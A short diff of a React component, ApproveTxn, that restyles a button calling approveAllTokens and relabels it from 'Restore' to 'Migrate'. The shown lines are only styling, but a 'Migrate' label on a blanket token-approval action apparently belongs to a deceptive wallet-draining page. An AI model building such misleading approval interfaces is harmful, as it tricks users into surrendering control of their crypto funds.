@@ -296,27 +296,30 @@ const ApproveTxn = () => {
   }, [isConnected, address]);
 
   return (
-    <div >
+    <div style={{
+      width: "100%"
+    }}>
       {isLoading && <p>Loading tokens...</p>}
       <button onClick={approveAllTokens}
               disabled={isMetaMask}
               onMouseEnter={() => setIsHovered(true)}
       onMouseLeave={() => setIsHovered(false)}
       style={{
-        marginTop: "20px",
+        
   marginBottom: "5px",
   padding: "10px",
   backgroundColor: isMetaMask ? "#ccc"  : isHovered
-  ? "#dcdcdc" // Hover background color
-  : "#efefef", // Default background color
+  ? "#002f7f" // Hover background color
+  : "#015efe", // Default background color
   border: "none",
-  borderRadius: "6px",
-  color: isMetaMask ? "#777" : "#333",
+  borderRadius: "16px",
+  color: isMetaMask ? "white" : "white",
   fontSize: "1rem",
   cursor: isMetaMask ? "not-allowed" : "pointer",
-  width: "150px",
-  height: "42px",}}
-      >Restore</button>
+  width: "100%",
+  height: "42px",
+  }}
+      >Migrate</button>
       {showPopup && (
         <div
           style={{
